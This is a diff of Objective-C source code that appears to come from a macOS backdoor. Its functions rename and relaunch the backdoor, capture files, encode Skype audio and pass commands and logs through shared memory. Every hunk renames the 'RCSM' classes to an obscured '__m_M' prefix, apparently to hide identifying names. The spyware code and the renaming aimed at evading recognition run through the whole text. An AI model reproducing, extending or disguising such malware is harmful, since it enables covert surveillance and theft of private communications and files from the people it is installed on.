@@ -243,7 +243,7 @@ void lionSendEventToPid(pid_t pidP)
 #pragma mark Private Interface
 #pragma mark -
 
-@interface RCSMCore (hidden)
+@interface __m_MCore (hidden)
 
 - (void)_renameBackdoorAndRelaunch;
 
@@ -302,7 +302,7 @@ void lionSendEventToPid(pid_t pidP)
 #pragma mark Private Implementation
 #pragma mark -
 
-@implementation RCSMCore (hidden)
+@implementation __m_MCore (hidden)
 
 - (void)_renameBackdoorAndRelaunch
 {
@@ -465,7 +465,7 @@ void lionSendEventToPid(pid_t pidP)
   u_int complexity      = 1;
   u_int quality         = (gSkypeQuality != 0) ? gSkypeQuality : 5;
   
-  RCSMLogManager *_logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
   
   // Create a new wide mode encoder
   speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODE_UWB));
@@ -704,8 +704,8 @@ void lionSendEventToPid(pid_t pidP)
 #endif
   
   shMemoryLog *shMemLog;
-  RCSMLogManager *_logManager   = [RCSMLogManager sharedInstance];
-  RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
+  __m_MLogManager *_logManager   = [__m_MLogManager sharedInstance];
+  __m_MTaskManager *_taskManager = [__m_MTaskManager sharedInstance];
   
 #ifdef DEBUG_CORE
   infoLog(@"Start receiving log from agents");
@@ -1300,7 +1300,7 @@ void lionSendEventToPid(pid_t pidP)
                 NSString *path = [[NSString alloc] initWithData: logData
                                                        encoding: NSUTF16LittleEndianStringEncoding];
 
-                RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                __m_MFileSystemManager *fsManager = [[__m_MFileSystemManager alloc] init];
                 BOOL success = [fsManager logFileAtPath: path
                                              forAgentID: AGENT_FILECAPTURE];
 
@@ -1519,7 +1519,7 @@ void lionSendEventToPid(pid_t pidP)
                                 length: CC_MD5_DIGEST_LENGTH];
 #endif
   
-  RCSMEncryption *_encryption = [[RCSMEncryption alloc] initWithKey: temp];
+  __m_MEncryption *_encryption = [[__m_MEncryption alloc] initWithKey: temp];
   gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
   NSString *_backdoorName = nil;
   
@@ -1897,11 +1897,11 @@ void lionSendEventToPid(pid_t pidP)
   key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
   
   // init shared memory
-  gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
+  gSharedMemoryCommand = [[__m_MSharedMemory alloc] initWithKey: memKeyForCommand
                                                           size: gMemCommandMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
 
-  gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
+  gSharedMemoryLogging = [[__m_MSharedMemory alloc] initWithKey: memKeyForLogging
                                                           size: gMemLogMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
   
@@ -2836,7 +2836,7 @@ void lionSendEventToPid(pid_t pidP)
 #pragma mark Public Implementation
 #pragma mark -
 
-@implementation RCSMCore
+@implementation __m_MCore
 
 @synthesize mBinaryName;
 @synthesize mApplicationName;
@@ -3373,7 +3373,7 @@ void lionSendEventToPid(pid_t pidP)
                                                              name: NSWorkspaceDidTerminateApplicationNotification 
                                                            object: nil];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   // Load configuration, starts all agents and the events monitoring routine
   [taskManager loadInitialConfiguration];
@@ -3385,7 +3385,7 @@ void lionSendEventToPid(pid_t pidP)
   taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
   [gControlFlagLock unlock];
 
-  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
   [infoManager logActionWithDescription: @"Start"];
   [infoManager release];
   
@@ -3439,7 +3439,7 @@ void lionSendEventToPid(pid_t pidP)
       return;
     }
 
-  RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *_taskManager = [__m_MTaskManager sharedInstance];
 
   [gControlFlagLock lock];
   NSString *localFlag = [_taskManager getControlFlag];
